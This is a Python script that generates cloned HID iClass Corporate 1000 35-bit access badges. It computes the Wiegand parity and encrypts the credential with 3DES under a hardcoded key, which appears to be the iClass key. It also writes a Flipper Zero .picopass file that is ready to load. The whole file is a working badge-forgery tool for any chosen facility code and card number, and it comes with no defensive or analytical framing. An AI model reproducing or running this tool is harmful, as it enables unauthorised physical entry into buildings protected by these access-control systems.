#!/usr/bin/python3
import sys
from Crypto.Cipher import DES3
import binascii
import argparse

def bitCount(int_type):
	# return number 1's in a number when represented as binary
	count = 0
	while(int_type):
		int_type &= int_type - 1
		count += 1
	return(count)
 
def generate35bitHex(facilityCode, cardCode):
	cardData = (facilityCode << 21) + (cardCode << 1)
	# 2nd MSB even parity 
	parity1 = bitCount(cardData & 0x1B6DB6DB6) & 1
	cardData += (parity1 << 33)	# add the parity bit (we need it for further parity calculations)
	# MSB odd parity is the LSB
	parity2 = bitCount(cardData & 0x36DB6DB6C) & 1 ^ 1
	cardData += parity2	# add the parity bit
	# LSB odd parity (covers all 34 other bits)
	parity3 = bitCount(cardData) & 1 ^ 1
	cardData += (parity3 << 34)	# add the parity bit
	cardData += 34359738368 # add 0x800000000 to ensure result passes parity
	return "%016X" % cardData # convert to hex, pad with zeros (9 characters)

def des3encrypt(wiegandString):
	# Define the key and data to be encrypted
	key = b'\xb4\x21\x2c\xca\xb7\xed\x21\x0f\x7b\x93\xd4\x59\x39\xc7\xdd\x36'
	data = int(wiegandString,16).to_bytes(24, 'big')

	# Create the 3DES cipher object and encrypt the data
	cipher = DES3.new(key, DES3.MODE_ECB)
	encrypted_data = binascii.hexlify(cipher.encrypt(data)).decode('utf-8')

	# Print the encrypted data in hex format
	return encrypted_data

def parseBlocks(encryptedString):
	blocks = [encryptedString[i:i+16] for i in range(0, len(encryptedString), 16)]
	blockSeven = blocks[-1]
	blockEight = blocks[-2]
	blockNine = blocks[-3]
	return blockSeven, blockEight, blockNine

def formatBlock(block):
	formattedBlock = ' '.join([block[i:i+2] for i in range(0, len(block), 2)])
	return formattedBlock

def flipperRFIDFormat(wiegandPlaintext):
	appendZero = wiegandPlaintext[1:] + wiegandPlaintext[0]
	RFIDList = [appendZero[i:i+2] for i in range(0,len(appendZero),2)][2:]
	RFIDList[0] = '02'
	wiegandFlipperRFID = ':'.join(RFIDList)
	return wiegandFlipperRFID

if __name__ == "__main__":
	# Define the command-line arguments
	parser = argparse.ArgumentParser(description='DESCRIPTION: Generate encrypted wiegand block for HID Corporate 1000 35-bit iClass cards. Can also generate .picopass files to be used with the Flipper Zero')
	parser.add_argument('--fc', type=int, default=None, required=True, help='facility code, usually an integer between 0 and 4095. Will most likely be common amongst all cards in the campus.')
	parser.add_argument('--cn', type=int, default=None, required=True, help='card number, usually an integer between 1 and 1048575. Unique to each card and will be printed on the back.')
	parser.add_argument('-n', '--name', type=str, default=None, required=False, help='the name or title of the badge owner (ex. \'john\' or \'manager\'). This name will be used to name the output file')
	
	# Parse the command-line arguments
	args = parser.parse_args()

	# Check the values of the command-line arguments
	if args.fc < 0 or args.fc > 4095:
		parser.error('--fc must be an integer between 0 and 4095')
	if args.cn < 1 or args.cn > 1048575:
		parser.error('--cn must be an integer between 1 and 1048575')

	# Get user input for badge details
	facilityCode = args.fc
	cardNumber = args.cn
	filename = args.name

	# Generate 35 bit hex string and encrypt it
	wiegandPlaintext = generate35bitHex(facilityCode, cardNumber)
	wiegandFlipperRFID = flipperRFIDFormat(wiegandPlaintext)
	wiegandEncrypted = str(des3encrypt(wiegandPlaintext)).upper()
	blockSeven,blockEight,blockNine = parseBlocks(wiegandEncrypted)
	formattedBlockSeven = formatBlock(blockSeven)
	formattedBlockEight = formatBlock(blockEight)
	formattedBlockNine = formatBlock(blockNine)

	print(f"\u001b[33m[\u001b[32m+\u001b[33m]\u001b[0m FC.......... {facilityCode}")
	print(f"\u001b[33m[\u001b[32m+\u001b[33m]\u001b[0m card num.... {cardNumber}")
	print(f"\u001b[33m[\u001b[32m+\u001b[33m]\u001b[0m plaintext... {wiegandPlaintext}")
	print(f"\u001b[33m[\u001b[32m+\u001b[33m]\u001b[0m Flip RFID... {wiegandFlipperRFID}")
	print(f"\u001b[33m[\u001b[32m+\u001b[33m]\u001b[0m encrypted... {blockSeven}")

	# Print the result in flipper picopass format
	if filename != None:
		with open(f"{filename}.picopass", 'w') as f:
			f.write('Filetype: Flipper Picopass device\n')
			f.write('Version: 1\n')
			f.write('# Picopass blocks\n')
			f.write('Block 0: 13 37 DE AD BE EF 13 37\n')
			f.write('Block 1: 12 FF FF FF E9 1F FF 3C\n')
			f.write('Block 2: E4 FF FF FF FF FF FF FF\n')
			f.write('Block 3: AA 59 0E E9 D8 32 7F 5D\n')
			f.write('Block 4: FF FF FF FF FF FF FF FF\n')
			f.write('Block 5: FF FF FF FF FF FF FF FF\n')
			f.write('Block 6: 03 03 03 03 00 03 E0 17\n')
			f.write(f'Block 7: {formattedBlockSeven}\n')
			f.write(f'Block 8: {formattedBlockEight}\n')
			f.write(f'Block 9: {formattedBlockNine}\n')
			f.write('Block 10: FF FF FF FF FF FF FF FF\n')
			f.write('Block 11: FF FF FF FF FF FF FF FF\n')
			f.write('Block 12: FF FF FF FF FF FF FF FF\n')
			f.write('Block 13: FF FF FF FF FF FF FF FF\n')
			f.write('Block 14: FF FF FF FF FF FF FF FF\n')
			f.write('Block 15: FF FF FF FF FF FF FF FF\n')
			f.write('Block 16: FF FF FF FF FF FF FF FF\n')
			f.write('Block 17: FF FF FF FF FF FF FF FF\n')
		print(f"Saved output to {filename}.picopass. Copy this file to apps_data/picopass directly using the SD card or via the qflipper app.")
	else:
		pass
